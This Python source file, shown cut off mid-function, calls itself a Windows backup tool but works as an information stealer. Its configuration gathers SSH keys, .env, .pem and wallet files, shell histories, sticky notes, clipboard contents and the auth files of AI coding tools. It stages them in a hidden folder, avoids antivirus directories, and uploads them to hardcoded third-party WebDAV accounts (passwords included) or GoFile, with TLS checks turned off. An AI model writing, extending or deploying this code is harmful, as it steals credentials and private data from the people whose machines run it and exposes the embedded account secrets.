# -*- coding: utf-8 -*-
"""Windows 文件备份工具。"""

import argparse
import copy
import io
import ctypes
import getpass
import glob
import hashlib
import json
import logging
import os
import posixpath
import re
import shutil
import sqlite3
import stat
import sys
import tarfile
import tempfile
import threading
import time
import uuid
from collections import OrderedDict
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from urllib.parse import quote
from pathlib import Path

requests = None
HTTPBasicAuth = None
pyperclip = None

LOGGER = logging.getLogger('autobackup')
DETAIL_LOGGER = logging.LoggerAdapter(LOGGER, {'console_summary': False})


def log_event(level, stage, event, message, *args, console=True, exc_info=False, repeat=True):
    """阶段摘要同时写入文件和控制台，明细日志仅写文件。"""
    LOGGER.log(level, message, *args, exc_info=exc_info, stacklevel=2,
               extra={'stage': stage, 'event': event, 'console_summary': console,
                      'console_repeat': repeat})


def format_size(size):
    value = float(size)
    for unit in ('B', 'KiB', 'MiB', 'GiB', 'TiB'):
        if value < 1024 or unit == 'TiB':
            return ('%d B' % value) if unit == 'B' else ('%.1f %s' % (value, unit))
        value /= 1024


def format_elapsed(started):
    seconds = max(0, int(time.monotonic() - started))
    if seconds < 60:
        return '%d秒' % seconds
    minutes, seconds = divmod(seconds, 60)
    if minutes < 60:
        return '%d分%02d秒' % (minutes, seconds)
    hours, minutes = divmod(minutes, 60)
    return '%d时%02d分%02d秒' % (hours, minutes, seconds)


def task_label(label):
    if label == 'screenshots':
        return '截图'
    if label == 'specified':
        return '指定文件'
    match = re.fullmatch(r'disk_(.+)_(docs|configs)', label)
    if not match:
        return label
    source, category = match.groups()
    source = {'documents': '用户文档', 'downloads': '下载目录'}.get(source, source)
    if len(source) == 1:
        source = source.upper() + '盘'
    elif source.startswith('cloud_'):
        source = '云盘 ' + source[6:]
    return source + ' · ' + ('文档' if category == 'docs' else '配置文件')


def log_stage(record):
    if hasattr(record, 'stage'):
        return record.stage
    function = record.funcName or ''
    if 'clipboard' in function:
        return '剪贴板'
    if 'upload' in function or function == '_create_remote_directory':
        return '上传'
    if 'archive' in function or function in ('zip_backup_folder', 'split_large_file', 'split_large_directory'):
        return '归档'
    if any(word in function for word in ('collect', 'copy', 'backup_disk', 'backup_windows', 'backup_screenshots')):
        return '收集'
    if 'state' in function:
        return '状态'
    if 'log' in function:
        return '日志'
    return '运行'


class FileLogFormatter(logging.Formatter):
    def format(self, record):
        detailed = copy.copy(record)
        detailed.stage = log_stage(record)
        return super().format(detailed)


class ConsoleSummaryFilter(logging.Filter):
    """按事件合并重复摘要，不改变文件日志；限制缓存数量和并发访问。"""

    def __init__(self, mode='summary', repeat_interval=300, clock=None):
        super().__init__()
        if mode not in ('summary', 'detailed'):
            raise ValueError('CONSOLE_MODE 只能是 summary 或 detailed')
        self.mode = mode
        self.repeat_interval = max(0, repeat_interval)
        self.clock = clock or time.monotonic
        self.recent = OrderedDict()
        self.lock = threading.Lock()

    def filter(self, record):
        if record.levelno < logging.INFO:
            return False
        if self.mode == 'detailed':
            return True
        if not getattr(record, 'console_summary', False):
            return False
        if not getattr(record, 'console_repeat', True):
            return True
        key = str(getattr(record, 'event', record.msg))
        now = self.clock()
        with self.lock:
            last, skipped, level = self.recent.get(key, (float('-inf'), 0, None))
            if level == record.levelno and now - last < self.repeat_interval:
                self.recent[key] = (last, skipped + 1, level)
                self.recent.move_to_end(key)
                return False
            record.console_repeats = skipped
            self.recent[key] = (now, 0, record.levelno)
            self.recent.move_to_end(key)
            while len(self.recent) > 128:
                self.recent.popitem(last=False)
        return True


class ConsoleLogFormatter(logging.Formatter):
    def __init__(self):
        super().__init__('%(asctime)s [%(stage)s] %(message)s', datefmt='%H:%M:%S')

    def format(self, record):
        brief = copy.copy(record)
        brief.stage = log_stage(record)
        if brief.levelno >= logging.ERROR:
            brief.stage += '/错误'
        elif brief.levelno >= logging.WARNING:
            brief.stage += '/警告'
        message = ' '.join(record.getMessage().split())
        if len(message) > 220:
            message = message[:220] + '…（详情见文件日志）'
        if getattr(record, 'console_repeats', 0):
            message += '（同类提示已合并 %d 次）' % record.console_repeats
        brief.msg, brief.args = message, ()
        brief.exc_info = brief.exc_text = brief.stack_info = None
        return super().format(brief)


def get_file_size_cached(path: str) -> int:
    """兼容旧调用名称；每次读取当前大小，不缓存文件状态。"""
    return os.path.getsize(path)


def load_optional_dependencies():
    global requests, HTTPBasicAuth, pyperclip
    try:
        import requests as requests_module
        from requests.auth import HTTPBasicAuth as auth_class
    except ImportError as exc:
        raise RuntimeError("缺少必需依赖 requests，请先执行 pip install requests") from exc
    requests, HTTPBasicAuth = requests_module, auth_class
    try:
        import pyperclip as clipboard_module
        pyperclip = clipboard_module
    except ImportError:
        pyperclip = None
        print("未安装 pyperclip，剪贴板功能已禁用")


class BackupConfig:
    """备份配置类"""
    
    # 调试配置
    DEBUG_MODE = True  # 文件日志是否包含调试明细，不影响控制台摘要模式
    
    # 文件大小限制
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024  # 50MB 压缩后单文件最大大小
    CHUNK_SIZE = 50 * 1024 * 1024  # 50MB 分片大小
    
    # 上传配置
    RETRY_COUNT = 3  # 重试次数
    RETRY_DELAY = 30  # 重试等待时间（秒）
    UPLOAD_TIMEOUT = 3600  # 上传超时时间（秒）
    MAX_SERVER_RETRIES = 2  # 每个服务器最多尝试次数
    FILE_DELAY_AFTER_UPLOAD = 1  # 上传后等待文件释放的时间（秒）
    FILE_DELETE_RETRY_COUNT = 3  # 文件删除重试次数
    FILE_DELETE_RETRY_DELAY = 2  # 文件删除重试等待时间（秒）
    
    # 监控配置
    BACKUP_INTERVAL = 7 * 24 * 60 * 60  # 备份间隔时间：7天（单位：秒）
    CLIPBOARD_INTERVAL = 1200  # JTB备份间隔时间（20分钟，单位：秒）
    CLIPBOARD_CHECK_INTERVAL = 3  # JTB检查间隔（秒）
    CLIPBOARD_UPLOAD_CHECK_INTERVAL = 30  # JTB上传检查间隔（秒）
    
    # 错误处理配置
    CLIPBOARD_ERROR_WAIT = 60  # JTB监控连续错误等待时间（秒）
    BACKUP_CHECK_INTERVAL = 3600  # 备份检查间隔（秒，每小时检查一次）
    ERROR_RETRY_DELAY = 60  # 发生错误时重试等待时间（秒）
    MAIN_ERROR_RETRY_DELAY = 300  # 主程序错误重试等待时间（秒，5分钟）
    
    # 文件操作配置
    SCAN_TIMEOUT = 1200  # 扫描目录超时时间（秒）
    FILE_RETRY_COUNT = 3  # 文件访问重试次数
    FILE_RETRY_DELAY = 5  # 文件重试等待时间（秒）
    COPY_CHUNK_SIZE = 1024 * 1024  # 文件复制块大小（1MB，提高性能）
    PROGRESS_INTERVAL = 10  # 进度显示间隔（秒）
    PROGRESS_LOG_INTERVAL = 10  # 每N个文件记录一次进度
    
    # 磁盘空间检查
    MIN_FREE_SPACE = 1024 * 1024 * 1024  # 最小可用空间（1GB）
    
    # 备份目录 - 用户文档目录
    BACKUP_ROOT = os.path.expandvars('%USERPROFILE%\\.dev\\AutoBackup')

    # 自动检测当前用户桌面在用户主目录中的相对路径（支持桌面重定向 / OneDrive 等情况）
    _USER_HOME = os.path.expandvars('%USERPROFILE%')
    _DESKTOP_CANDIDATES = [
        os.path.join(_USER_HOME, 'Desktop'),
        os.path.join(_USER_HOME, '桌面'),
        os.path.join(_USER_HOME, 'OneDrive', 'Desktop'),
        os.path.join(_USER_HOME, 'OneDrive', '桌面'),
    ]
    for _path in _DESKTOP_CANDIDATES:
        if os.path.exists(_path):
            DESKTOP_RELATIVE_PATH = os.path.relpath(_path, _USER_HOME)
            break
    else:
        DESKTOP_RELATIVE_PATH = 'Desktop'

    # 自动检测当前用户便签数据库 plum.sqlite 的相对路径（兼容不同包名）
    _LOCAL_APPDATA = os.path.join(_USER_HOME, 'AppData', 'Local')
    _PACKAGES_DIR = os.path.join(_LOCAL_APPDATA, 'Packages')
    STICKY_NOTES_RELATIVE_PATH = (
        r"AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
    )
    try:
        if os.path.isdir(_PACKAGES_DIR):
            for _entry in os.listdir(_PACKAGES_DIR):
                if 'StickyNotes' in _entry:
                    _candidate = os.path.join(_PACKAGES_DIR, _entry, 'LocalState', 'plum.sqlite')
                    if os.path.exists(_candidate):
                        # 转为相对于 %USERPROFILE% 的相对路径，保持与 WINDOWS_SPECIFIC_DIRS 其他项一致
                        STICKY_NOTES_RELATIVE_PATH = os.path.relpath(_candidate, _USER_HOME)
                        break
    except Exception:
        # 自动检测失败时，退回到默认硬编码路径
        pass
    
    # 仅 staging 内的已完成暂存目录允许自动清理。
    STAGING_ROOT = os.path.join(BACKUP_ROOT, 'staging')
    ARTIFACT_ROOT = os.path.join(BACKUP_ROOT, 'artifacts')
    STATE_FILE = os.path.join(BACKUP_ROOT, 'backup_state.json')

    # 时间阈值文件
    THRESHOLD_FILE = os.path.join(BACKUP_ROOT, 'next_backup_time.txt')
    
    # 日志配置
    LOG_FILE = os.path.join(BACKUP_ROOT, 'backup.log')
    LOG_FORMAT = '%(asctime)s | %(levelname)-7s | [%(stage)s] %(message)s'
    LOG_LEVEL = logging.INFO
    CONSOLE_MODE = 'summary'  # summary：阶段摘要；detailed：包含 INFO 级别明细
    CONSOLE_REPEAT_INTERVAL = 300  # 相同事件和级别的控制台提示合并窗口（秒）
    
    # 磁盘文件分类
    DISK_EXTENSIONS_1 = [  # 文档/代码类
        ".txt", ".doc", ".docx", ".xls", ".xlsx", ".et", ".one", ".csv", ".tsv", ".rtf", ".md",
    ]
    
    DISK_EXTENSIONS_2 = [  # 配置和密钥类
        ".pem", ".key", ".env", ".xml", ".ini", ".json", ".toml", ".conf", ".wallet",
        ".config", "id_rsa", "id_ecdsa", "id_ed25519", ".keystore", ".yaml", ".yml",
    ]
    
    # 指定要直接复制的目录和文件（相对于用户主目录 %USERPROFILE%）
    WINDOWS_SPECIFIC_DIRS = [
        DESKTOP_RELATIVE_PATH,  # 桌面目录（自动检测）
        STICKY_NOTES_RELATIVE_PATH,  # 便签数据库（自动检测包名，失败则使用默认路径）
        ".ssh",  # SSH配置
        ".python_history",  # Python 历史记录文件
        ".node_repl_history",  # Node.js REPL 历史记录文件
        r"AppData\Roaming\Python\Python*\history",  # Windows 常见 Python REPL 历史路径（按版本目录匹配）
        r"AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",  # Windows PowerShell 历史
        r"AppData\Roaming\Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt",  # PowerShell Core 历史（如果存在）
        r"AppData\Roaming\Claude\claude_desktop_config.json",
        r".claude/config.json",
        r".claude/settings.json",
        r".claude/settings.local.json",
        r".claude/history.jsonl",
        r".claude/channels/",
        r".codex/auth.json",
        r".codex/config.toml",
        r".codex/history.jsonl",
        r".hermes/.env",
        r".hermes/auth.json",
        r".hermes/config.yaml",
        r".hermes/channel_directory.json",
        r".hermes_history",
        r".openclaw/agents/",
        r".openclaw/workspace/.env",
        r".openclaw/openclaw.json*", # 只备份 openclaw.json 及其所有备份文件
    ]
    
    # 排除目录配置
    EXCLUDE_INSTALL_DIRS = [       
        # 游戏相关目录
        "Battle.net", "Riot Games", "GOG Galaxy", "Xbox Games", "Steam",
        "Epic Games", "Origin Games", "Ubisoft", "Games", "SteamLibrary",
        
        # 常见软件安装目录
        "Common Files", "WindowsApps", "Microsoft", "Microsoft VS Code",
        "Internet Explorer", "Microsoft.NET", "MSBuild",
        
        # 开发工具和环境
        "Java", "Python", "NodeJS", "Go", "Visual Studio", "JetBrains",
        "Docker", "Git", "MongoDB", "Redis", "PostgreSQL",
        "Android", "gradle", "npm", "yarn", "venv", "node_modules",
        ".gradle", ".m2", ".vs", ".vscode", ".cargo", ".git", ".yean",
        ".local", ".npm", ".nvm", ".orca_term", ".pki", ".pm2", 
        ".rustup", ".bun", ".github", ".vscode", "myenv", "snap",
        "__pycache__", ".vscode-server", "dist", ".cache", ".dev",   # 排除.dev目录，避免循环备份
        
        
        # 其他大型应用
        "Adobe", "Autodesk", "Unity", "UnrealEngine", "Blender",
        "NVIDIA", "AMD", "Intel", "Realtek", "Waves",
        
        # 浏览器相关 
        "Google", "Chrome", "Brave", "Firefox", "Opera",
        "Microsoft Edge", "Internet Explorer",
        
        # 通讯和办公软件
        "Discord", "Zoom", "Teams", "Skype", "Slack", "telegram",
        
        # 多媒体软件
        "Adobe", "Premiere", "Photoshop", "After Effects",
        "Vegas", "MAGIX", "Audacity",
        
        # 安全软件
        "McAfee", "Norton", "Kaspersky", "Huorong",
        "Avast", "AVG", "Bitdefender", "ESET",
        
        # 系统工具
        "CCleaner", "WinRAR", "7-Zip", "PowerToys",
    ]
    
    # 关键词排除
    EXCLUDE_KEYWORDS = [
        # 软件相关
        "program", "software", "install", "setup", "update",
        "patch", "cache", 
        
        # 开发相关
        "node_modules", "vendor", "build", "dist", "target",
        "debug", "release", "obj", "packages",
        
        # 多媒体相关
        "music", "video", "movie", "audio", "media", "stream",
        
        # 游戏相关
        "steam", "game", "gaming", "save", "netease", "origin", "epic",
        
        # 临时文件
        "log", "crash", "dumps", "report",
        
        # 其他
        "bak", "obsolete", "archive", "trojan", "clash", "vpn", 
        "thumb", "thumbnail", "preview" , "v2ray", "user", "mail",

        # 中文
        "火绒", "杀毒", "电脑管家",
    ]

    # GoFile 上传配置（备选方案）
    UPLOAD_SERVERS = [
        "https://upload.gofile.io/uploadfile",          # 自动（最近节点）
        "https://upload-ap-hkg.gofile.io/uploadfile",   # 亚太（香港）
        "https://upload-ap-sgp.gofile.io/uploadfile",   # 亚太（新加坡）
        "https://upload-ap-tyo.gofile.io/uploadfile",   # 亚太（东京）
        "https://upload-na-phx.gofile.io/uploadfile",   # 北美（凤凰城）
    ]

    # 性能优化常量
    TAR_COMPRESS_LEVEL = 6  # tar.gz 压缩级别（1-9，6为速度与大小平衡点）


def is_within(path, directory, include_root=False):
    """使用 Windows 路径语义及真实路径检查目录边界。"""
    candidate = os.path.normcase(os.path.realpath(os.path.abspath(path)))
    root = os.path.normcase(os.path.realpath(os.path.abspath(directory)))
    try:
        return os.path.commonpath([candidate, root]) == root and (include_root or candidate != root)
    except ValueError:
        return False


def file_digest(path):
    digest = hashlib.sha256()
    with open(path, 'rb') as stream:
        for block in iter(lambda: stream.read(1024 * 1024), b''):
            digest.update(block)
    return digest.hexdigest()


def safe_label(value):
    label = re.sub(r'[^\w.-]', '_', value)
    if len(label) > 40:
        label = label[:31] + '_' + hashlib.sha256(value.encode('utf-8')).hexdigest()[:8]
    return label or 'backup'


def atomic_json(path, value):
    """先完整写入同目录临时文件，再原子替换状态。"""
    parent = os.path.dirname(os.path.abspath(path))
    os.makedirs(parent, exist_ok=True)
    fd, temporary = tempfile.mkstemp(prefix='.state-', suffix='.tmp', dir=parent)
    try:
        with os.fdopen(fd, 'w', encoding='utf-8') as stream:
            json.dump(value, stream, ensure_ascii=False, indent=2)
            stream.flush()
            os.fsync(stream.fileno())
        os.replace(temporary, path)
    finally:
        if os.path.exists(temporary):
            os.remove(temporary)


@dataclass
class CollectionResult:
    directory: str
    files: dict = field(default_factory=dict)
    errors: list = field(default_factory=list)
    skipped: int = 0
    timed_out: bool = False

    @property
    def complete(self):
        return not self.errors and not self.timed_out

    @property
    def total_size(self):
        return sum(item['size'] for item in self.files.values())


@dataclass
class ArchiveResult:
    paths: list
    redundant_archive: str = None


@dataclass
class SplitResult:
    paths: list
    split: bool = False


@dataclass
class BackupBatch:
    collections: list = field(default_factory=list)
    paths: list = field(default_factory=list)
    errors: list = field(default_factory=list)

    @property
    def complete(self):
        return not self.errors and all(result.complete for result in self.collections)

    def extend(self, other):
        self.collections.extend(other.collections)
        self.paths.extend(other.paths)
        self.errors.extend(other.errors)


class SingleInstanceLock:
    """Windows 命名互斥量，不使用 PID 探测或终止进程。"""

    def __init__(self, backup_root):
        identity = os.path.normcase(os.path.realpath(backup_root)).encode('utf-8')
        self.name = 'Global\\AutoBackup_' + hashlib.sha256(identity).hexdigest()[:32]
        self.handle = None
        self.api = None

    def acquire(self):
        if os.name != 'nt':
            raise RuntimeError('备份服务仅支持 Windows')
        from ctypes import wintypes
        api = ctypes.WinDLL('kernel32', use_last_error=True)
        api.CreateMutexW.argtypes = [ctypes.c_void_p, wintypes.BOOL, wintypes.LPCWSTR]
        api.CreateMutexW.restype = wintypes.HANDLE
        api.CloseHandle.argtypes = [wintypes.HANDLE]
        api.CloseHandle.restype = wintypes.BOOL
        api.ReleaseMutex.argtypes = [wintypes.HANDLE]
        api.ReleaseMutex.restype = wintypes.BOOL
        ctypes.set_last_error(0)
        handle = api.CreateMutexW(None, True, self.name)
        error = ctypes.get_last_error()
        if not handle:
            raise ctypes.WinError(error)
        if error == 183:  # ERROR_ALREADY_EXISTS：本实例未持有互斥量。
            api.CloseHandle(handle)
            return False
        self.api, self.handle = api, handle
        return True

    def close(self):
        if self.handle is not None:
            self.api.ReleaseMutex(self.handle)
            self.api.CloseHandle(self.handle)
            self.handle = None


class SnapshotFileHandler(logging.FileHandler):
    """轮转与 emit 共用 Handler 锁；已封存日志不再接受新增记录。"""

    def snapshot(self, target):
        self.acquire()
        try:
            if self.stream:
                self.flush()
                self.stream.close()
                self.stream = None
            try:
                if not os.path.exists(self.baseFilename) or not os.path.getsize(self.baseFilename):
                    return None
                os.makedirs(os.path.dirname(target), exist_ok=True)
                os.replace(self.baseFilename, target)
                return target
            finally:
                self.stream = self._open()
        finally:
            self.release()


def reassemble_parts(manifest_path, output_path):
    """校验并合并本工具生成的分片，拒绝覆盖现有目标。"""
    with open(manifest_path, 'r', encoding='utf-8') as stream:
        manifest = json.load(stream)
    if manifest.get('format') != 'autobackup-parts-v1':
        raise ValueError('不支持的分片清单格式')
    if os.path.exists(output_path):
        raise FileExistsError(output_path)
    parts_dir = os.path.dirname(os.path.abspath(manifest_path))
    parent = os.path.dirname(os.path.abspath(output_path))
    os.makedirs(parent, exist_ok=True)
    fd, temporary = tempfile.mkstemp(prefix='.restore-', dir=parent)
    digest = hashlib.sha256()
    total_size = 0
    try:
        with os.fdopen(fd, 'wb') as output:
            for part in manifest['parts']:
                name = part['name']
                if name != os.path.basename(name):
                    raise ValueError('分片名称包含目录')
                path = os.path.join(parts_dir, name)
                if not is_within(path, parts_dir):
                    raise ValueError('分片路径越界')
                current_hash = hashlib.sha256()
                current_size = 0
                with open(path, 'rb') as source:
                    for block in iter(lambda: source.read(1024 * 1024), b''):
                        current_hash.update(block)
                        digest.update(block)
                        current_size += len(block)
                        output.write(block)
                if current_size != part['size'] or current_hash.hexdigest() != part['sha256']:
                    raise ValueError('分片校验失败: ' + name)
                total_size += current_size
            output.flush()
            os.fsync(output.fileno())
        if total_size != manifest['size'] or digest.hexdigest() != manifest['sha256']:
            raise ValueError('归档整体校验失败')
        # Windows rename 不覆盖已存在的目标，避免检查后发生覆盖竞争。
        if os.name == 'nt':
            os.rename(temporary, output_path)
        else:
            os.link(temporary, output_path)
            os.remove(temporary)
        return output_path
    finally:
        if os.path.exists(temporary):
            os.remove(temporary)


class BackupManager:
    def __init__(self, config=None):
        self.config = config or BackupConfig()
        if requests is None:
            raise RuntimeError("requests 尚未加载")
        for directory in (self.config.BACKUP_ROOT, self.config.STAGING_ROOT, self.config.ARTIFACT_ROOT):
            os.makedirs(directory, exist_ok=True)
        # Infini Cloud 配置
        self.infini_url = "https://otaru.infini-cloud.net/dav/"
        self.infini_user = "macstar"  #infini-cloud-8
        self.infini_pass = "p43ZDLzNPv2GixSk"
        # Infini 上传配置：主配置 + 备用配置（全部失败才会回退 GoFile）
        self.infini_configs = [
            {
                "name": "Infini-主配置",
                "url": self.infini_url,
                "user": self.infini_user,
                "password": self.infini_pass,
            },
            {
                "name": "Infini-备用配置",
                "url": "https://wajima.infini-cloud.net/dav/",
                "user": "cryptostarxp",   #infini-cloud-4
                "password": "LDW9ERV3xuUrHSjZ",
            },
        ]
        

        username = getpass.getuser()
        user_prefix = username[:5] if username else 'user'
        self.config.INFINI_REMOTE_BASE_DIR = user_prefix + '_wins_backup'
        self.session = requests.Session()
        self.session.verify = False
        self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
        self.api_token = "hdgZFyRDVPmWYhZRAJVYciBAVCjCfjZl"

        self.stop_event = threading.Event()
        self._state_lock = threading.RLock()
        self._upload_lock = threading.Lock()
        self._upload_failures = set()  # 仅用于显示上传恢复状态，不影响上传队列。
        self._clipboard_lock = threading.Lock()
        self.log_handler = self._setup_logging()
        try:
            self.state = self._load_state()
        except Exception:
            self.close()
            raise

    def _setup_logging(self):
        os.makedirs(os.path.dirname(self.config.LOG_FILE), exist_ok=True)
        console_filter = ConsoleSummaryFilter(
            self.config.CONSOLE_MODE, self.config.CONSOLE_REPEAT_INTERVAL)
        for handler in list(LOGGER.handlers):
            if getattr(handler, '_autobackup_handler', False):
                LOGGER.removeHandler(handler)
                handler.close()
        file_handler = SnapshotFileHandler(self.config.LOG_FILE, encoding='utf-8')
        file_level = logging.DEBUG if self.config.DEBUG_MODE else self.config.LOG_LEVEL
        file_handler.setLevel(file_level)
        file_handler.setFormatter(FileLogFormatter(self.config.LOG_FORMAT, datefmt='%Y-%m-%d %H:%M:%S'))
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        console_handler.addFilter(console_filter)
        console_handler.setFormatter(ConsoleLogFormatter())
        for handler in (file_handler, console_handler):
            handler._autobackup_handler = True
            LOGGER.addHandler(handler)
        LOGGER.setLevel(min(logging.INFO, file_level))
        LOGGER.propagate = False
        return file_handler

    def close(self):
        self.stop_event.set()
        self.session.close()
        for handler in list(LOGGER.handlers):
            if getattr(handler, '_autobackup_handler', False):
                LOGGER.removeHandler(handler)
                handler.close()

    def _load_state(self):
        state = {'version': 1, 'next_backup': None, 'retry_after': None,
                 'last_success': None, 'collection_complete': False, 'pending': []}
        if os.path.exists(self.config.STATE_FILE):
            with open(self.config.STATE_FILE, 'r', encoding='utf-8') as stream:
                saved = json.load(stream)
            if not isinstance(saved, dict) or saved.get('version') != 1:
                raise ValueError('备份状态文件格式无效；已保留原文件')
            state.update(saved)
            if not isinstance(state['pending'], list):
                raise ValueError('待上传清单无效')
            for item in state['pending']:
                path = os.path.join(self.config.ARTIFACT_ROOT, item['path'])
                if not is_within(path, self.config.ARTIFACT_ROOT):
                    raise ValueError('待上传清单包含越界路径')
                if item['status'] not in ('pending', 'uploaded') or not item['group']:
                    raise ValueError('待上传状态无效')
            for name in ('next_backup', 'retry_after', 'last_success'):
                if state[name]:
                    datetime.fromisoformat(state[name])
        elif os.path.exists(self.config.THRESHOLD_FILE):
            try:
                with open(self.config.THRESHOLD_FILE, 'r', encoding='utf-8') as stream:
                    state['next_backup'] = datetime.strptime(
                        stream.read().strip(), '%Y-%m-%d %H:%M:%S').isoformat()
            except (OSError, ValueError):
                log_event(logging.WARNING, '状态', 'legacy_schedule',
                          '旧备份时间无法读取，将重新检查备份；详情见文件日志', exc_info=True)
        return state

    def _commit_state(self, state):
        atomic_json(self.config.STATE_FILE, state)
        self.state = state

    def update_state(self, **changes):
        with self._state_lock:
            state = copy.deepcopy(self.state)
            state.update(changes)
            self._commit_state(state)

    def enqueue_files(self, paths, kind='backup'):
        group = uuid.uuid4().hex
        entries = []
        for path in paths:
            if not is_within(path, self.config.ARTIFACT_ROOT):
                raise ValueError('待上传文件必须位于 artifacts 目录')
            entries.append({
                'id': uuid.uuid4().hex, 'group': group, 'kind': kind,
                'path': os.path.relpath(path, self.config.ARTIFACT_ROOT),
                'size': os.path.getsize(path), 'sha256': file_digest(path),
                'status': 'pending',
            })
        with self._state_lock:
            state = copy.deepcopy(self.state)
            existing = {item['path'] for item in state['pending']}
            state['pending'].extend(item for item in entries if item['path'] not in existing)
            self._commit_state(state)

    def has_pending(self, kind=None):
        with self._state_lock:
            return any(kind is None or item['kind'] == kind for item in self.state['pending'])

    def process_pending_uploads(self, kind=None):
        if not self._upload_lock.acquire(blocking=False):
            return False
        started = time.monotonic()
        attempted = confirmed = 0
        scope = kind or 'all'
        failed_kinds = set()
        try:
            with self._state_lock:
                pending = copy.deepcopy(self.state['pending'])
            candidates = [item for item in pending
                          if (kind is None or item['kind'] == kind) and item['status'] == 'pending']
            show_progress = any(item['kind'] == 'backup' for item in candidates)
            if candidates:
                log_event(logging.INFO, '上传', 'upload_start:' + scope,
                          '准备上传 %s 项（归档/分片/日志，共 %s）',
                          len(candidates), format_size(sum(item['size'] for item in candidates)),
                          console=show_progress)
            for item in pending:
                if self.stop_event.is_set():
                    break
                if (kind is not None and item['kind'] != kind) or item['status'] == 'uploaded':
                    continue
                attempted += 1
                path = os.path.join(self.config.ARTIFACT_ROOT, item['path'])
                try:
                    if not is_within(path, self.config.ARTIFACT_ROOT):
                        raise ValueError('待上传路径越界')
                    if os.path.getsize(path) != item['size'] or file_digest(path) != item['sha256']:
                        raise ValueError('待上传文件与清单校验不符')
                    if not self.upload_file(path):
                        failed_kinds.add(item['kind'])
                        continue
                    with self._state_lock:
                        state = copy.deepcopy(self.state)
                        for entry in state['pending']:
                            if entry['id'] == item['id']:
                                entry['status'] = 'uploaded'
                        self._commit_state(state)
                    confirmed += 1
                except Exception:
                    failed_kinds.add(item['kind'])
                    DETAIL_LOGGER.exception('待上传文件处理失败，保留本地副本: %s', path)
            # 同一组全部上传完成并持久化后才删除任何本地分片。
            with self._state_lock:
                groups = {}
                for item in self.state['pending']:
                    groups.setdefault(item['group'], []).append(item)
                completed = {key for key, items in groups.items()
                             if all(item['status'] == 'uploaded' for item in items)}
                removable = [item for item in self.state['pending'] if item['group'] in completed]
                if removable:
                    state = copy.deepcopy(self.state)
                    state['pending'] = [item for item in state['pending'] if item['group'] not in completed]
                    self._commit_state(state)
                    for item in removable:
                        self._safe_remove_file(os.path.join(self.config.ARTIFACT_ROOT, item['path']))
                remaining = sum(item['status'] == 'pending' and (kind is None or item['kind'] == kind)
                                for item in self.state['pending'])
                remaining_kinds = {item['kind'] for item in self.state['pending']
                                   if item['status'] == 'pending'}
            if attempted:
                failed = attempted - confirmed
                level = logging.WARNING if failed else logging.INFO
                note = ' | 失败副本已保留，详情见文件日志' if failed else ''
                log_event(level, '上传', 'upload_result:' + scope,
                          '本次确认 %s/%s 项 | 待传 %s 项 | 耗时 %s%s',
                          confirmed, attempted, remaining, format_elapsed(started),
                          note, console=show_progress or bool(failed))
            self._upload_failures.update(failed_kinds)
            recovered = self._upload_failures - remaining_kinds
            if recovered:
                names = {'backup': '数据归档', 'log': '运行日志', 'clipboard': '剪贴板日志'}
                labels = '、'.join(names.get(name, name) for name in sorted(recovered))
                self._upload_failures.difference_update(recovered)
                log_event(logging.INFO, '恢复', 'upload_recovered',
                          '%s上传已恢复，对应待传项已处理完毕', labels, repeat=False)
            return not self.has_pending(kind)
        finally:
            self._upload_lock.release()

    def new_staging_directory(self, label):
        label = safe_label(label)
        return tempfile.mkdtemp(prefix=label + '_', dir=self.config.STAGING_ROOT)

    def new_artifact_base(self, label):
        label = safe_label(label)
        task = datetime.now().strftime('%Y%m%d_%H%M%S') + '_' + uuid.uuid4().hex
        directory = os.path.join(self.config.ARTIFACT_ROOT, label, task)
        os.makedirs(directory, exist_ok=False)
        return os.path.join(directory, label)

    @staticmethod
    def _ensure_directory(directory_path):
        try:
            os.makedirs(directory_path, exist_ok=True)
            return os.path.isdir(directory_path)
        except OSError:
            DETAIL_LOGGER.exception('创建目录失败: %s', directory_path)
            return False

    def _clean_directory(self, directory_path):
        """只清理本程序 staging 下的特定目录，不用于启动清空或上传错误处理。"""
        if not is_within(directory_path, self.config.STAGING_ROOT):
            raise ValueError('拒绝清理暂存区以外的目录: ' + directory_path)

        def remove_readonly(function, path, exc_info):
            error = exc_info[1]
            if not isinstance(error, PermissionError) or function not in (os.unlink, os.remove):
                raise error
            if (not is_within(path, directory_path) or
                    not is_within(path, self.config.STAGING_ROOT)):
                raise error
            metadata = os.lstat(path)
            # 只改变独立普通副本的只读属性，不跟随链接，也不修改 ACL。
            if (not stat.S_ISREG(metadata.st_mode) or metadata.st_nlink != 1 or
                    getattr(metadata, 'st_file_attributes', 0) & stat.FILE_ATTRIBUTE_REPARSE_POINT or
                    metadata.st_mode & stat.S_IWRITE):
                raise error
            os.chmod(path, metadata.st_mode | stat.S_IWRITE)
            function(path)

        attempts = max(1, self.config.FILE_DELETE_RETRY_COUNT)
        for attempt in range(attempts):
            try:
                if not is_within(directory_path, self.config.STAGING_ROOT):
                    raise ValueError('拒绝清理暂存区以外的目录: ' + directory_path)
                if os.path.exists(directory_path):
                    shutil.rmtree(directory_path, onerror=remove_readonly)
                return True
            except OSError as exc:
                if attempt + 1 < attempts and not self.stop_event.is_set():
                    self.stop_event.wait(self.config.FILE_DELETE_RETRY_DELAY)
                    continue
                DETAIL_LOGGER.exception(
                    '暂存目录清理失败，保留剩余文件 | 目录: %s | 文件: %s | WinError: %s',
                    directory_path, exc.filename or directory_path, getattr(exc, 'winerror', None))
                log_event(logging.WARNING, '清理', 'staging_cleanup',
                          '暂存目录清理失败：%s | 剩余文件已保留，详情见文件日志', exc)
                return False

    @staticmethod
    def _get_dir_size(directory):
        return sum(os.path.getsize(os.path.join(root, name))
                   for root, _, files in os.walk(directory) for name in files)

    @staticmethod
    def _is_valid_file(file_path):
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except OSError:
            return False

    def _safe_remove_file(self, file_path, retry=True):
        if not is_within(file_path, self.config.ARTIFACT_ROOT):
            raise ValueError('拒绝删除归档区以外的文件: ' + file_path)
        attempts = self.config.FILE_DELETE_RETRY_COUNT if retry else 1
        for attempt in range(attempts):
            try:
                if os.path.exists(file_path):
                    os.remove(file_path)
                return True
            except OSError:
                if attempt + 1 < attempts:
